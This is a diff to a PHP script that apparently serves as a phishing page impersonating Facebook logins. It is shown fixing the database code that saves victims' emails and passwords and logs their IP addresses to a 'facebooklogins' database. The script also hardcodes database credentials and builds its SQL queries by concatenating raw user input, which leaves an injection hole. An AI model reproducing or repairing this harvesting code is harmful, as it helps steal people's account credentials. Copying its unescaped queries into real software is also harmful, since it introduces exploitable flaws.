@@ -28,20 +28,25 @@
        $ip=$_SERVER['REMOTE_ADDR'];
       }
       $hostname = "localhost";
-      $username = "user";
-      $password = "pass";
-      $db = "facebooklogins"
+      $username = "id8415478_user";
+      $password = "password";
+      $db = "id8415478_facebooklogins";
       /* connect to database */
       $conn = mysqli_connect($hostname, $username, $password, $db);
       /* failed connection */
       if (!$conn) {
         proceed();
       }
-      $query_1 = "'INSERT INTO basics VALUES ('.$email.','.$pass.','.$time') ON DUPLICATE KEY UPDATE password='{$pass}'";
-      $query_2 =
-      if (!mysqli_query($dbconnect, $query)) {
+      $query_1 = "INSERT INTO basics (email, password) VALUES ('".$email."','".$pass."') ON DUPLICATE KEY UPDATE password='".$pass."';";
+
+        $query_2 = "INSERT INTO details (email, ipaddress) VALUES ('".$email."',INET_ATON('".$ip."'));";
+      if (!mysqli_query($conn, $query_1) || !mysqli_query($conn, $query_2)) {
+        mysqli_close($conn);
         proceed();
+      } else {
+        mysqli_close($conn);
       }
+
     }
 
    echo
@@ -55,7 +60,7 @@
 
      '</form>'.
 
-   '</body>'. proceed(); .
+  '</body>'. proceed();
 
 
 '</html>';
